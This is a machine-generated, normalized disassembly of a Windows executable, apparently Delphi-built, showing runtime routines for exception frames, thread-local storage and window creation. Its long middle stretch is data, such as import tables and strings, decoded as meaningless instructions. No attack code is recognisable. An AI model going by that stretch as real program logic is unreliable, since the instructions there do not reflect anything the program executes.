mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405ae0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405b7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f50
mov eax ebx
xor edx edx
call sub_4047a8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b86
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax ebx
call sub_40479c
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_40459c
mov eax ebx
call sub_40479c
push eax
mov eax [ ebp - 0x4 ]
call sub_404210
inc eax
push eax
mov eax ebx
call sub_40478c
push eax
mov eax [ ebp - 0x4 ]
call sub_404410
pop ecx
pop edx
call sub_4058cc
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f50
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_40459c
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fa4
sub_405b8c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405c23
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404630
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c2a
lea eax [ ebp - 0x4 ]
call sub_404630
retn
mov eax ebx
call sub_404210
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404878
mov eax ebx
call sub_404210
push eax
mov eax [ ebp - 0x4 ]
call sub_40479c
inc eax
push eax
mov eax ebx
call sub_404410
push eax
mov eax [ ebp - 0x4 ]
call sub_40478c
pop ecx
pop edx
call sub_4059a8
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404630
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404878
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40466c
sub_405c30
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405c73
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_40477c
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c7a
lea eax [ ebp - 0x4 ]
call sub_404630
retn
sub_405c80
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404148
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4051ec
push eax
call sub_4012ac
mov ecx eax
mov edx esp
mov eax esi
call sub_404040
jmp r-xdata
sub_405cd8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405d3e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401274
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_4041c0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402b7c
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d45
lea eax [ ebp - 0x10 ]
call sub_403f50
retn
xor ebx ebx
sub_405d4c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405d96
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d9d
retn
mov eax rw-data
call sub_4029b8
mov eax rw-data
call sub_4029b8
mov eax rw-data
call sub_4029b8
call sub_401ae0
sub_405da0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404cec
call sub_402f94
test al al
je r-xdata
call sub_403088
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40132c
mov [ rw-data ] eax
call sub_401324
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_402fc4
call sub_40129c
call sub_405cd8
mov [ rw-data ] eax
call sub_401324
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40129c
call sub_405cd8
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_40131c
mov [ rw-data ] eax
sub_405ea8
push ebx
call sub_405ea0
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405e94
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403ec0
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403ec0
sub_405eec
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405ea8
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405f38
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405e74
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405f2c
mov edx rw-data
mov eax ebx
call sub_403c14
pop ebx
retn
sub_405f7c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405fa1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405fa8
retn
sub_405ff0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_40600c
push ebx
mov ebx [ eax + 0x8 ]
mov ecx [ eax ]
sub ebx ecx
sar ebx 0x1
jns r-xdata
add ebx ecx
mov [ edx ] ebx
mov ebx [ eax + 0xc ]
mov ecx [ eax + 0x4 ]
sub ebx ecx
sar ebx 0x1
jns r-xdata
adc ebx 0x0
add ebx ecx
mov [ edx + 0x4 ] ebx
pop ebx
retn
adc ebx 0x0
sub_406038
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40605d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406064
retn
sub_406072
inc eax
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
jo r-xdata
outsd
dec esi
outsd
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
mov bl 0x48
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
dec eax
jb r-xdata
jb r-xdata
je r-xdata
add [ ebx + 0x3025ffc0 ] cl
mov bl 0x48
add [ ebx + 0x2c25ffc0 ] cl
mov bl 0x48
sar bh 0x25
xor al 0xb3
dec eax
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ ebx + 0x2825ffc0 ] cl
mov bl 0x48
add [ ebx + 0x2425ffc0 ] cl
mov bl 0x48
add [ ebx + 0x2025ffc0 ] cl
mov bl 0x48
add [ ebx + 0x1c25ffc0 ] cl
mov bl 0x48
add [ ebx + 0x1825ffc0 ] cl
mov bl 0x48
add [ ebx + 0x1425ffc0 ] cl
mov bl 0x48
add [ ebx + 0x1025ffc0 ] cl
mov bl 0x48
add [ ebx + 0xc25ffc0 ] cl
mov bl 0x48
add [ ebx + 0x825ffc0 ] cl
mov bl 0x48
add [ ebx + 0x425ffc0 ] cl
mov bl 0x48
add [ ebx + 0x25ffc0 ] cl
mov bl 0x48
add [ ebx - 0x3da0040 ] cl
mov dl 0x48
add [ ebx - 0x7da0040 ] cl
mov dl 0x48
add [ ebx - 0xbda0040 ] cl
mov dl 0x48
add [ ebx - 0xfda0040 ] cl
mov dl 0x48
add [ ebx - 0x13da0040 ] cl
mov dl 0x48
add [ ebx - 0x17da0040 ] cl
mov dl 0x48
add [ ebx - 0x1bda0040 ] cl
mov dl 0x48
add [ ebx - 0x1fda0040 ] cl
mov dl 0x48
add [ ebx - 0x23da0040 ] cl
mov dl 0x48
add [ ebx - 0x27da0040 ] cl
mov dl 0x48
add [ ebx - 0x2bda0040 ] cl
mov dl 0x48
add [ ebx - 0x2fda0040 ] cl
mov dl 0x48
add [ ebx - 0x33da0040 ] cl
mov dl 0x48
add [ ebx - 0x37da0040 ] cl
mov dl 0x48
add [ ebx - 0x3bda0040 ] cl
mov dl 0x48
add [ ebx - 0x3fda0040 ] cl
mov dl 0x48
add [ ebx - 0x43da0040 ] cl
mov dl 0x48
add [ ebx - 0x47da0040 ] cl
mov dl 0x48
add [ ebx - 0x4bda0040 ] cl
mov dl 0x48
add [ ebx - 0x4fda0040 ] cl
mov dl 0x48
add [ ebx - 0x53da0040 ] cl
mov dl 0x48
add [ ebx - 0x57da0040 ] cl
mov dl 0x48
add [ ebx - 0x5bda0040 ] cl
mov dl 0x48
add [ ebx - 0x5fda0040 ] cl
mov dl 0x48
add [ ebx - 0x63da0040 ] cl
mov dl 0x48
add [ ebx - 0x67da0040 ] cl
mov dl 0x48
add [ ebx - 0x6bda0040 ] cl
mov dl 0x48
add [ ebx - 0x6fda0040 ] cl
mov dl 0x48
add [ ebx - 0x73da0040 ] cl
mov dl 0x48
add [ ebx - 0x77da0040 ] cl
mov dl 0x48
add [ ebx - 0x7bda0040 ] cl
mov dl 0x48
add [ ebx - 0x7fda0040 ] cl
mov dl 0x48
add [ ebx + 0x7c25ffc0 ] cl
mov dl 0x48
add [ ebx + 0x7825ffc0 ] cl
mov dl 0x48
add [ ebx + 0x7425ffc0 ] cl
mov dl 0x48
add [ ebx + 0x7025ffc0 ] cl
mov dl 0x48
add [ ebx + 0x6c25ffc0 ] cl
mov dl 0x48
add [ ebx + 0x6825ffc0 ] cl
mov dl 0x48
add [ ebx + 0x6425ffc0 ] cl
mov dl 0x48
add [ ebx + 0x6025ffc0 ] cl
mov dl 0x48
add [ ebx + 0x5c25ffc0 ] cl
mov dl 0x48
add [ ebx + 0x5825ffc0 ] cl
mov dl 0x48
add [ ebx + 0x5425ffc0 ] cl
mov dl 0x48
add [ ebx + 0x5025ffc0 ] cl
mov dl 0x48
add [ ebx + 0x4c25ffc0 ] cl
mov dl 0x48
add [ ebx + 0x4825ffc0 ] cl
mov dl 0x48
add [ ebx + 0x4425ffc0 ] cl
mov dl 0x48
add [ ebx + 0x4025ffc0 ] cl
mov dl 0x48
add [ ebx + 0x3c25ffc0 ] cl
mov dl 0x48
add [ ebx + 0x3825ffc0 ] cl
mov dl 0x48
add [ ebx + 0x3425ffc0 ] cl
mov dl 0x48
add [ ebx + 0x3025ffc0 ] cl
mov dl 0x48
add [ ebx + 0x2c25ffc0 ] cl
mov dl 0x48
add [ ebx + 0x2825ffc0 ] cl
mov dl 0x48
add [ ebx + 0x2425ffc0 ] cl
mov dl 0x48
add [ ebx + 0x2025ffc0 ] cl
mov dl 0x48
add [ ebx + 0x1c25ffc0 ] cl
mov dl 0x48
add [ ebx + 0x1825ffc0 ] cl
mov dl 0x48
add [ ebx + 0x5825ffc0 ] cl
mov bl 0x48
add [ ebx + 0x5425ffc0 ] cl
mov bl 0x48
add [ ebx + 0x5025ffc0 ] cl
mov bl 0x48
add [ ebx + 0x4425ffc0 ] cl
mov ah 0x48
add [ ebx + 0x4025ffc0 ] cl
mov ah 0x48
add [ ebx + 0x3c25ffc0 ] cl
mov ah 0x48
add [ ebx + 0x3825ffc0 ] cl
mov ah 0x48
add [ ebx + 0x3425ffc0 ] cl
mov ah 0x48
add [ ebx + 0x3025ffc0 ] cl
mov ah 0x48
add [ ebx + 0x2c25ffc0 ] cl
mov ah 0x48
add [ ebx + 0x2825ffc0 ] cl
mov ah 0x48
add [ ebx + 0x2425ffc0 ] cl
mov ah 0x48
add [ ebx + 0x2025ffc0 ] cl
mov ah 0x48
add [ ebx + 0x1c25ffc0 ] cl
mov ah 0x48
add [ ebx + 0x1825ffc0 ] cl
mov ah 0x48
add [ ebx + 0x1425ffc0 ] cl
mov ah 0x48
add [ ebx + 0x1025ffc0 ] cl
mov ah 0x48
add [ ebx + 0xc25ffc0 ] cl
mov ah 0x48
add [ ebx + 0x825ffc0 ] cl
mov ah 0x48
add [ ebx + 0x425ffc0 ] cl
mov ah 0x48
add [ ebx + 0x25ffc0 ] cl
mov ah 0x48
add [ ebx - 0x3da0040 ] cl
mov bl 0x48
add [ ebx - 0x7da0040 ] cl
mov bl 0x48
add [ ebx - 0xbda0040 ] cl
mov bl 0x48
add [ ebx - 0xfda0040 ] cl
mov bl 0x48
add [ ebx - 0x13da0040 ] cl
mov bl 0x48
add [ ebx - 0x17da0040 ] cl
mov bl 0x48
add [ ebx - 0x1bda0040 ] cl
mov bl 0x48
add [ ebx - 0x1fda0040 ] cl
mov bl 0x48
add [ ebx - 0x23da0040 ] cl
mov bl 0x48
add [ ebx - 0x27da0040 ] cl
mov bl 0x48
add [ ebx - 0x2bda0040 ] cl
mov bl 0x48
add [ ebx - 0x2fda0040 ] cl
mov bl 0x48
add [ ebx - 0x33da0040 ] cl
mov bl 0x48
add [ ebx - 0x37da0040 ] cl
mov bl 0x48
add [ ebx - 0x3bda0040 ] cl
mov bl 0x48
add [ ebx - 0x3fda0040 ] cl
mov bl 0x48
add [ ebx - 0x43da0040 ] cl
mov bl 0x48
add [ ebx - 0x47da0040 ] cl
mov bl 0x48
add [ ebx - 0x4bda0040 ] cl
mov bl 0x48
add [ ebx - 0x4fda0040 ] cl
mov bl 0x48
add [ ebx - 0x53da0040 ] cl
mov bl 0x48
add [ ebx - 0x57da0040 ] cl
mov bl 0x48
add [ ebx - 0x5bda0040 ] cl
mov bl 0x48
add [ ebx - 0x5fda0040 ] cl
mov bl 0x48
add [ ebx - 0x63da0040 ] cl
mov bl 0x48
add [ ebx - 0x67da0040 ] cl
mov bl 0x48
add [ ebx - 0x6bda0040 ] cl
mov bl 0x48
add [ ebx - 0x6fda0040 ] cl
mov bl 0x48
add [ ebx - 0x73da0040 ] cl
mov bl 0x48
add [ ebx - 0x77da0040 ] cl
mov bl 0x48
add [ ebx - 0x7bda0040 ] cl
mov bl 0x48
add [ ebx - 0x7fda0040 ] cl
mov bl 0x48
add [ ebx + 0x7c25ffc0 ] cl
mov bl 0x48
add [ ebx + 0x7825ffc0 ] cl
mov bl 0x48
add [ ebx + 0x7425ffc0 ] cl
mov bl 0x48
add [ ebx + 0x7025ffc0 ] cl
mov bl 0x48
add [ ebx + 0x6c25ffc0 ] cl
mov bl 0x48
add [ ebx + 0x6825ffc0 ] cl
mov bl 0x48
add [ ebx + 0x6425ffc0 ] cl
mov bl 0x48
add [ ebx + 0x6025ffc0 ] cl
mov bl 0x48
add [ ebx - 0x3bda0040 ] cl
mov dh 0x48
add [ ebx - 0x3fda0040 ] cl
mov dh 0x48
add [ ebx - 0x4bda0040 ] cl
mov dh 0x48
add [ ebx - 0x53da0040 ] cl
mov dh 0x48
add [ ebx - 0x57da0040 ] cl
mov dh 0x48
add [ ebx - 0x5bda0040 ] cl
mov dh 0x48
add [ ebx - 0x4fda0040 ] cl
mov dh 0x48
add [ ebx - 0x43da0040 ] cl
mov dh 0x48
add [ ebx - 0x47da0040 ] cl
mov dh 0x48
add [ ebx - 0x5fda0040 ] cl
mov dh 0x48
add [ ebx - 0x63da0040 ] cl
mov dh 0x48
add [ ebx - 0x67da0040 ] cl
mov dh 0x48
add [ ebx - 0x6bda0040 ] cl
mov dh 0x48
add [ ebx - 0x6fda0040 ] cl
mov dh 0x48
add [ ebx - 0x73da0040 ] cl
mov dh 0x48
add [ ebx - 0x77da0040 ] cl
mov dh 0x48
add [ ebx - 0x7bda0040 ] cl
mov dh 0x48
add [ ebx - 0x7fda0040 ] cl
mov dh 0x48
add [ ebx + 0x7c25ffc0 ] cl
mov dh 0x48
add [ ebx + 0x7825ffc0 ] cl
mov dh 0x48
add [ ebx + 0x7425ffc0 ] cl
mov dh 0x48
add [ ebx + 0x7025ffc0 ] cl
mov dh 0x48
add [ ebx + 0x6c25ffc0 ] cl
mov dh 0x48
add [ ebx + 0x6825ffc0 ] cl
mov dh 0x48
add [ ebx + 0x6425ffc0 ] cl
mov dh 0x48
add [ ebx + 0x6025ffc0 ] cl
mov dh 0x48
add [ ebx + 0x5c25ffc0 ] cl
mov dh 0x48
add [ ebx + 0x5825ffc0 ] cl
mov dh 0x48
add [ ebx + 0x5425ffc0 ] cl
mov dh 0x48
add [ ebx + 0x5025ffc0 ] cl
mov dh 0x48
add [ ebx + 0x4c25ffc0 ] cl
mov dh 0x48
add [ ebx + 0x4825ffc0 ] cl
mov dh 0x48
add [ ebx + 0x4425ffc0 ] cl
mov dh 0x48
add [ ebx + 0x4025ffc0 ] cl
mov dh 0x48
add [ ebx + 0x3c25ffc0 ] cl
mov dh 0x48
add [ ebx + 0x3825ffc0 ] cl
mov dh 0x48
add [ ebx + 0x3425ffc0 ] cl
mov dh 0x48
add [ ebx + 0x3025ffc0 ] cl
mov dh 0x48
add [ ebx + 0x2c25ffc0 ] cl
mov dh 0x48
add [ ebx + 0x2825ffc0 ] cl
mov dh 0x48
add [ ebx + 0x2425ffc0 ] cl
mov dh 0x48
add [ ebx + 0x2025ffc0 ] cl
mov dh 0x48
add [ ebx + 0x1c25ffc0 ] cl
mov dh 0x48
add [ ebx + 0x1825ffc0 ] cl
mov dh 0x48
add [ ebx + 0x1425ffc0 ] cl
mov dh 0x48
add [ ebx + 0x1025ffc0 ] cl
mov dh 0x48
add [ ebx + 0xc25ffc0 ] cl
mov dh 0x48
add [ ebx + 0x825ffc0 ] cl
mov dh 0x48
add [ ebx + 0x425ffc0 ] cl
mov dh 0x48
add [ ebx + 0x25ffc0 ] cl
mov dh 0x48
add [ ebx - 0x3da0040 ] cl
mov ch 0x48
add [ ebx - 0x7da0040 ] cl
mov ch 0x48
add [ ebx - 0xbda0040 ] cl
mov ch 0x48
add [ ebx - 0xfda0040 ] cl
mov ch 0x48
add [ ebx - 0x13da0040 ] cl
mov ch 0x48
add [ ebx - 0x17da0040 ] cl
mov ch 0x48
add [ ebx - 0x1bda0040 ] cl
mov ch 0x48
add [ ebx - 0x1fda0040 ] cl
mov ch 0x48
add [ ebx - 0x23da0040 ] cl
mov ch 0x48
add [ ebx - 0x27da0040 ] cl
mov ch 0x48
add [ ebx - 0x2bda0040 ] cl
mov ch 0x48
add [ ebx - 0x2fda0040 ] cl
mov ch 0x48
add [ ebx - 0x33da0040 ] cl
mov ch 0x48
add [ ebx - 0x37da0040 ] cl
mov ch 0x48
add [ ebx - 0x3bda0040 ] cl
mov ch 0x48
add [ ebx - 0x3fda0040 ] cl
mov ch 0x48
add [ ebx - 0x43da0040 ] cl
mov ch 0x48
add [ ebx - 0x47da0040 ] cl
mov ch 0x48
add [ ebx - 0x4bda0040 ] cl
mov ch 0x48
add [ ebx - 0x4fda0040 ] cl
mov ch 0x48
add [ ebx - 0x53da0040 ] cl
mov ch 0x48
add [ ebx - 0x57da0040 ] cl
mov ch 0x48
add [ ebx - 0x5bda0040 ] cl
mov ch 0x48
add [ ebx - 0x5fda0040 ] cl
mov ch 0x48
add [ ebx - 0x63da0040 ] cl
mov ch 0x48
add [ ebx - 0x67da0040 ] cl
mov ch 0x48
add [ ebx - 0x6bda0040 ] cl
mov ch 0x48
add [ ebx - 0x6fda0040 ] cl
mov ch 0x48
add [ ebx - 0x43da0040 ] cl
mov ch 0x48
add [ ebx - 0x73da0040 ] cl
mov ch 0x48
add [ ebx - 0x77da0040 ] cl
mov ch 0x48
add [ ebx - 0x7bda0040 ] cl
mov ch 0x48
add [ ebx - 0x7fda0040 ] cl
mov ch 0x48
add [ ebx + 0x7c25ffc0 ] cl
mov ch 0x48
add [ ebx + 0x7825ffc0 ] cl
mov ch 0x48
add [ ebx + 0x7825ffc0 ] cl
mov ch 0x48
add [ ebx + 0x7425ffc0 ] cl
mov ch 0x48
add [ ebx + 0x7025ffc0 ] cl
mov ch 0x48
add [ ebx + 0x6c25ffc0 ] cl
mov ch 0x48
add [ ebx + 0x6825ffc0 ] cl
mov ch 0x48
add [ ebx + 0x6425ffc0 ] cl
mov ch 0x48
add [ ebx + 0x6025ffc0 ] cl
mov ch 0x48
add [ ebx + 0x5c25ffc0 ] cl
mov ch 0x48
add [ ebx + 0x5825ffc0 ] cl
mov ch 0x48
add [ ebx + 0x5425ffc0 ] cl
mov ch 0x48
add [ ebx + 0x5025ffc0 ] cl
mov ch 0x48
add [ ebx + 0x4c25ffc0 ] cl
mov ch 0x48
add [ ebx + 0x4825ffc0 ] cl
mov ch 0x48
add [ ebx + 0x4425ffc0 ] cl
mov ch 0x48
add [ ebx + 0x4025ffc0 ] cl
mov ch 0x48
add [ ebx + 0x3c25ffc0 ] cl
mov ch 0x48
add [ ebx + 0x3825ffc0 ] cl
mov ch 0x48
add [ ebx + 0x3425ffc0 ] cl
mov ch 0x48
add [ ebx + 0x3025ffc0 ] cl
mov ch 0x48
add [ ebx + 0x2c25ffc0 ] cl
mov ch 0x48
add [ ebx + 0x2825ffc0 ] cl
mov ch 0x48
add [ ebx + 0x2425ffc0 ] cl
mov ch 0x48
add [ ebx + 0x2025ffc0 ] cl
mov ch 0x48
add [ ebx + 0x1c25ffc0 ] cl
mov ch 0x48
add [ ebx + 0x1825ffc0 ] cl
mov ch 0x48
add [ ebx + 0x1425ffc0 ] cl
mov ch 0x48
add [ ebx + 0x1025ffc0 ] cl
mov ch 0x48
add [ ebx + 0xc25ffc0 ] cl
mov ch 0x48
add [ ebx + 0x825ffc0 ] cl
mov ch 0x48
add [ ebx + 0x425ffc0 ] cl
mov ch 0x48
add [ ebx + 0x25ffc0 ] cl
mov ch 0x48
add [ ebx - 0x3da0040 ] cl
mov ah 0x48
add [ ebx - 0x7da0040 ] cl
mov ah 0x48
add [ ebx - 0xbda0040 ] cl
mov ah 0x48
add [ ebx - 0xfda0040 ] cl
mov ah 0x48
add [ ebx - 0x13da0040 ] cl
mov ah 0x48
add [ ebx - 0x17da0040 ] cl
mov ah 0x48
add [ ebx - 0x1bda0040 ] cl
mov ah 0x48
add [ ebx - 0x1fda0040 ] cl
mov ah 0x48
add [ ebx - 0x23da0040 ] cl
mov ah 0x48
add [ ebx - 0x27da0040 ] cl
mov ah 0x48
add [ ebx - 0x2bda0040 ] cl
mov ah 0x48
add [ ebx - 0x2fda0040 ] cl
mov ah 0x48
add [ ebx - 0x33da0040 ] cl
mov ah 0x48
add [ ebx - 0x37da0040 ] cl
mov ah 0x48
add [ ebx - 0x3bda0040 ] cl
mov ah 0x48
add [ ebx - 0x3fda0040 ] cl
mov ah 0x48
add [ ebx - 0x43da0040 ] cl
mov ah 0x48
add [ ebx - 0x47da0040 ] cl
mov ah 0x48
add [ ebx - 0x4bda0040 ] cl
mov ah 0x48
add [ ebx - 0x4fda0040 ] cl
mov ah 0x48
add [ ebx - 0x53da0040 ] cl
mov ah 0x48
add [ ebx - 0x57da0040 ] cl
mov ah 0x48
add [ ebx - 0x5bda0040 ] cl
mov ah 0x48
add [ ebx - 0x5fda0040 ] cl
mov ah 0x48
add [ ebx - 0x63da0040 ] cl
mov ah 0x48
add [ ebx - 0x67da0040 ] cl
mov ah 0x48
add [ ebx - 0x6bda0040 ] cl
mov ah 0x48
add [ ebx - 0x6fda0040 ] cl
mov ah 0x48
add [ ebx - 0x73da0040 ] cl
mov ah 0x48
add [ ebx - 0x77da0040 ] cl
mov ah 0x48
add [ ebx - 0x7bda0040 ] cl
mov ah 0x48
add [ ebx - 0x7fda0040 ] cl
mov ah 0x48
add [ ebx + 0x7c25ffc0 ] cl
mov ah 0x48
add [ ebx + 0x7825ffc0 ] cl
mov ah 0x48
add [ ebx + 0x7425ffc0 ] cl
mov ah 0x48
add [ ebx + 0x7025ffc0 ] cl
mov ah 0x48
add [ ebx + 0x6c25ffc0 ] cl
mov ah 0x48
add [ ebx + 0x6825ffc0 ] cl
mov ah 0x48
add [ ebx + 0x6425ffc0 ] cl
mov ah 0x48
add [ ebx + 0x6025ffc0 ] cl
mov ah 0x48
add [ ebx + 0x5c25ffc0 ] cl
mov ah 0x48
add [ ebx + 0x5825ffc0 ] cl
mov ah 0x48
add [ ebx + 0x5425ffc0 ] cl
mov ah 0x48
add [ ebx + 0x5025ffc0 ] cl
mov ah 0x48
add [ ebx + 0xff25c0 ] cl
add [ eax ] al
and edx 0xff
shl edx 0x8
or ax dx
retn
dec eax
ja DeleteFileA
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x3c25ffc0 ] cl
add [ ebx + 0x4425ffc0 ] cl
mov bl 0x48
add [ ebx + 0x4025ffc0 ] cl
mov bl 0x48
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je EnumCalendarInfoA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
and al 0x61
inc eax
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x3825ffc0 ] cl
mov bl 0x48
add [ ebx + 0x3425ffc0 ] cl
mov bl 0x48
mov eax eax
add esi [ eax + 0x60 ]
inc eax
add [ ebx + 0x1025ffc0 ] cl
mov dl 0x48
add [ ebx + 0xc25ffc0 ] cl
mov dl 0x48
add [ ebx + 0x825ffc0 ] cl
mov dl 0x48
add [ ebx + 0x4825ffc0 ] cl
mov bl 0x48
sub_406b6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402934
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402924
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406bc4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402934
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402924
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406c1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
